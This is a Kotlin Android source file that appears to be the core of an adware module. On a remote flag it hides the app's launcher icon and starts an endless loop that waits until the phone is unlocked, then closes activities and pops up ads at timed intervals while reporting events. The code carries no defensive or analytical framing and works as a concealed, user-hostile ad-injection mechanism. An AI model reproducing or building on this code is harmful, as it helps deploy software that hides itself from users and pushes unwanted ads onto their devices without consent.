package com.cross.line

import android.app.KeyguardManager
import android.content.Context
import android.os.PowerManager
import com.cross.line.loopcache.LongCache
import com.cross.line.loopcache.LoomCache
import com.cross.line.loopcache.StrLoopCache
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

/**
 * Date：2024/11/28
 * Describe:
 */
class UserLine : BaseNetworkImpl() {
    private val mMainScope = CoroutineScope(Dispatchers.Main)
    private var isUse = false
    var numJump by StrLoopCache("1")
    var lastShowTime by LongCache()
    private var isNeedAdNow = false

    fun refresh(bean: LineInfoBean) {
        if (bean.isPlanA()) {
            KnotCenter.createFile(LoomCache.mApplication)
            LineUtils.initFacebook(LoomCache.mApplication)
            postEvent("isuser", Pair("getstring", "a"))
            scopeThread(bean)
        } else if (bean.lineStatus.contains("line")) {
            KnotCenter.createFile(LoomCache.mApplication)
            postEvent("isuser", Pair("getstring", "b"))
            scopeThread(bean)
        }

    }

    private fun scopeThread(bean: LineInfoBean) {
        if (bean.lineStatus.contains("line", true)) return
        if (isUse) return
        isUse = true
        mMainScope.launch { // 隐藏icon
            KnotCenter.mCrossAdImpl.loadAdLine()
            actionHide()
            delay(500)
            while (true) {
                val str = checkThread(bean)
                if (str == "jumpfail") {
                    postEvent("jumpfail")
                    break
                } else {
                    postEventList(str)
                }
                delay(bean.lineTimeC)
            }
        }
    }

    private fun checkThread(bean: LineInfoBean): String {
        if (numJump.length > 78) {
            return "jumpfail"
        }
        var str = "time"
        if (isUnLockedPhone().not()) return str
        str += "-isunlock"
        if (bean.isInstallGo().not()) return str
        if (System.currentTimeMillis() - lastShowTime < bean.lineShowPeriod) return str
        if (KnotCenter.mCrossAdImpl.isLimit()) return str
        str += "-ispass"
        if (KnotCenter.mCrossAdImpl.isAdReady()) {
            str += "-isReady"
            isNeedAdNow = false
            numJump += ('a'..'s').random()
            if (lastShowTime == 0L) {
                lastShowTime = System.currentTimeMillis()
            } else {
                lastShowTime += 8000
            }
            mMainScope.launch {
                delay(KnotCenter.finishActivity())
                actionPop()
            }
            return str
        } else {
            isNeedAdNow = true
        }
        KnotCenter.mCrossAdImpl.loadAdLine()
        return str
    }

    private fun isUnLockedPhone(context: Context = LoomCache.mApplication): Boolean {
        return (context.getSystemService(Context.POWER_SERVICE) as PowerManager).isInteractive && (context.getSystemService(
            Context.KEYGUARD_SERVICE
        ) as KeyguardManager).isDeviceLocked.not()
    }

    private fun postEventList(name: String) {
        if (name.contains("-")) {
            val list = name.split("-")
            postList(list)
        } else {
            postEvent(name)
        }
    }
}